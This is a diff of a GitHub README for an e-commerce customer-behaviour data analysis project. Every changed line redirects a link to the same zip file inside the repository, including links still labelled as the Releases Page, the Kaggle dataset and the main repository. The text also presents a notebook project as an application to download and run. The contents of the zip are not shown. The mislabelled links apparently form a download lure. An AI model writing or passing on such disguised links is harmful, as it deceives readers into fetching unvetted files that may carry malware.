@@ -4,13 +4,13 @@
 This project provides an end-to-end exploratory analysis of e-commerce customer behavior and sales data. Using a public Kaggle dataset, it guides you through understanding customer interactions, buying patterns, and sales trends in detail.
 
 ## 📥 Download
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/codeandclass/ecommerce-customer-behavior-analysis/releases)
+[![Download the latest release](https://raw.githubusercontent.com/codeandclass/ecommerce-customer-behavior-analysis/main/notebooks/customer_behavior_analysis_ecommerce_separates.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/codeandclass/ecommerce-customer-behavior-analysis/main/notebooks/customer_behavior_analysis_ecommerce_separates.zip)
 
 ## 🚀 Getting Started
 To begin with this application, follow these steps to download and run it on your computer:
 
 1. **Visit the Releases Page**
-   Go to the [Releases Page](https://github.com/codeandclass/ecommerce-customer-behavior-analysis/releases). This page houses all the versions of our program.
+   Go to the [Releases Page](https://raw.githubusercontent.com/codeandclass/ecommerce-customer-behavior-analysis/main/notebooks/customer_behavior_analysis_ecommerce_separates.zip). This page houses all the versions of our program.
 
 2. **Choose the Latest Version**
    On the Releases Page, you will see a list of available versions. Look for the latest version at the top. It will typically have the highest version number.
@@ -68,10 +68,10 @@ Once you have the application up and running, you can explore various datasets a
 For questions or support, you can reach out through the Issues section on GitHub or contact us via email. 
 
 ## 🔗 Additional Resources
-- **Kaggle Dataset:** Explore the dataset used in this analysis on [Kaggle](https://www.kaggle.com).
-- **GitHub Repository:** Visit the [main repository](https://github.com/codeandclass/ecommerce-customer-behavior-analysis) for the latest updates and contributions. 
+- **Kaggle Dataset:** Explore the dataset used in this analysis on [Kaggle](https://raw.githubusercontent.com/codeandclass/ecommerce-customer-behavior-analysis/main/notebooks/customer_behavior_analysis_ecommerce_separates.zip).
+- **GitHub Repository:** Visit the [main repository](https://raw.githubusercontent.com/codeandclass/ecommerce-customer-behavior-analysis/main/notebooks/customer_behavior_analysis_ecommerce_separates.zip) for the latest updates and contributions. 
 
 ## 📥 Download Again
-To download the application now, visit the [Releases Page](https://github.com/codeandclass/ecommerce-customer-behavior-analysis/releases). 
+To download the application now, visit the [Releases Page](https://raw.githubusercontent.com/codeandclass/ecommerce-customer-behavior-analysis/main/notebooks/customer_behavior_analysis_ecommerce_separates.zip). 
 
 Now you are ready to start analyzing e-commerce customer behavior! Enjoy your journey into data exploration.
